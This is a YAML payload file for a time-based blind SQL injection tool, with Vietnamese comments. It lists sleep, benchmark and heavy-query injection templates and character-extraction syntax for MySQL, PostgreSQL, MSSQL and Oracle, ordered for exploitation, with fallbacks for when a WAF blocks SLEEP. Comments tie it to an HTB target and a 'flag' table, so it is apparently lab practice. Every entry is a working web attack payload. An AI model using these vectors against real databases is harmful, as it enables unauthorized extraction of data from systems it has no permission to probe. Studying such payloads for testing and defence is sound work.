# =============================================================================
# vectors.yaml - kho vector time-based blind cho nhiều DBMS (cấu trúc 2 tầng)
# =============================================================================
#
# Mỗi DBMS là một block gồm:
#   dialect: các "mảnh" cú pháp để extract() lắp ráp câu truy vấn suy luận
#   vectors: danh sách vector sleep (template có placeholder)
#
# Placeholder trong template vector:
#   [INFERENCE]  - chỗ cắm điều kiện. Lúc dò: 1=1 / 1=2. Lúc khai thác: điều kiện binary-search.
#   [SLEEPTIME]  - số giây sleep (từ --delay)
#   [RANDNUM]    - số nguyên ngẫu nhiên (tránh cache, đặt alias)
#   [RANDSTR]    - chuỗi ngẫu nhiên (đặt tên alias subquery)
#
# Placeholder trong dialect (extract() dùng .format):
#   {s} - biểu thức chuỗi nguồn (vd "(select content from flag)")
#   {i} - vị trí ký tự (1-based)
#   {c} - biểu thức một ký tự (vd substr(...))
#   {h} - chuỗi hex (cho hex literal)
#
# Thứ tự vector trong mỗi DBMS: ưu tiên vector KIỂM SOÁT số lần sleep (subquery-wrapped)
# trước, rồi sleep trần, rồi fallback (benchmark/heavy). Vector đầu tiên vượt qua xác nhận
# TRUE/FALSE sẽ được chốt cho toàn bộ khai thác.
# =============================================================================

mysql:
  dialect:
    substr:  "substr(({s}),{i},1)"      # lấy ký tự thứ i
    ascii:   "ord({c})"                 # mã ký tự
    length:  "length(({s}))"            # độ dài byte
    charlen: "char_length(({s}))"       # độ dài ký tự (phát hiện multibyte)
    hex:     "hex(({s}))"               # hex hóa
    hexlit:  "0x{h}"                    # hex literal (cho verify không cần nháy)
    notnull: "(({s}) is not null)"      # kiểm tra subquery có dữ liệu
  # Query mặc định theo DBMS (dùng khi không truyền --query). Nguồn: sqlmap queries.xml
  queries:
    version:  "select version()"
    database: "select database()"
    user:     "select current_user()"
    hostname: "select @@hostname"
  vectors:
    # query-SLEEP bọc subquery: sleep chỉ chạy 1 lần kể cả trong JOIN (ưu tiên cao)
    - name: mysql-query-sleep
      template: "(select [RANDNUM] from (select(sleep([SLEEPTIME]-if([INFERENCE],0,[SLEEPTIME]))))[RANDSTR])"
      note: "an toàn cho JOIN/ORDER BY - sleep chỉ chạy 1 lần"
    # inline scalar sleep: phổ biến nhất, hợp scalar/numeric context (INSERT id)
    - name: mysql-inline-sleep
      template: "(if([INFERENCE],sleep([SLEEPTIME]),1))"
      note: "scalar/numeric context - vector mặc định target HTB hiện tại"
    # fallback khi sleep() bị filter
    - name: mysql-benchmark
      template: "(if([INFERENCE],benchmark(3000000,md5(1)),1))"
      note: "khi SLEEP bị WAF chặn (hoặc MySQL < 5.0.12)"
    # fallback khi cả sleep lẫn benchmark bị chặn
    - name: mysql-heavy
      template: "(if([INFERENCE],(select count(*) from information_schema.columns a,information_schema.columns b),1))"
      note: "ép DB làm việc nặng - khi không còn hàm sleep nào dùng được"

postgresql:
  dialect:
    substr:  "substr(({s}),{i},1)"
    ascii:   "ascii({c})"
    length:  "length(({s}))"
    charlen: "length(({s}))"            # pg: length() là theo ký tự
    hex:     "encode(convert_to(({s}),'UTF8'),'hex')"
    hexlit:  "decode('{h}','hex')"      # pg không có 0x literal
    notnull: "(({s}) is not null)"
  queries:
    version:  "select version()"
    database: "select current_database()"
    user:     "select current_user"
    hostname: "select inet_server_addr()"
  vectors:
    - name: pg-sleep-case
      template: "(case when [INFERENCE] then pg_sleep([SLEEPTIME]) else pg_sleep(0) end)"
      note: "CASE WHEN - pg không có if() scalar"
    - name: pg-sleep-and
      template: "(select [RANDNUM] where [INFERENCE] and pg_sleep([SLEEPTIME]) is not null)"
      note: "biến thể bọc select"

mssql:
  dialect:
    substr:  "SUBSTRING(({s}),{i},1)"
    ascii:   "UNICODE({c})"
    length:  "LEN(({s}))"
    charlen: "LEN(({s}))"
    hex:     "master.dbo.fn_varbintohexstr(CONVERT(varbinary,({s})))"
    hexlit:  "0x{h}"
    notnull: "(CASE WHEN ({s}) IS NOT NULL THEN 1 ELSE 0 END)=1"
  queries:
    version:  "select @@version"
    database: "select db_name()"
    user:     "select system_user"
    hostname: "select @@servername"
  vectors:
    # WAITFOR DELAY là STATEMENT, không phải scalar -> cần ngữ cảnh statement/stacked
    - name: mssql-waitfor
      template: "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'"
      note: "statement-context - cần stacked query, KHÔNG inline scalar được"
    - name: mssql-waitfor-inline
      template: "(CASE WHEN [INFERENCE] THEN (SELECT 1 WHERE 1=1 WAITFOR DELAY '0:0:[SLEEPTIME]') ELSE 1 END)"
      note: "biến thể thử bọc subquery (tùy phiên bản có thể không hợp lệ)"

oracle:
  dialect:
    substr:  "SUBSTR(({s}),{i},1)"
    ascii:   "ASCII({c})"
    length:  "LENGTH(({s}))"
    charlen: "LENGTH(({s}))"
    hex:     "RAWTOHEX(UTL_RAW.CAST_TO_RAW(({s})))"
    hexlit:  "'{h}'"                    # oracle: so sánh hex như chuỗi
    notnull: "(({s}) is not null)"
  queries:
    version:  "select banner from v$version where rownum=1"
    database: "select sys.database_name from dual"
    user:     "select user from dual"
    hostname: "select sys_context('userenv','server_host') from dual"
  vectors:
    - name: oracle-heavy-case
      template: "(case when [INFERENCE] then (select count(*) from all_objects,all_objects) else 0 end)"
      note: "heavy query - oracle không có sleep để dùng; dbms_lock.sleep cần quyền"
    - name: oracle-dbms-lock
      template: "(case when [INFERENCE] then dbms_lock.sleep([SLEEPTIME]) else 0 end)"
      note: "cần quyền EXECUTE trên dbms_lock (thường không có)"
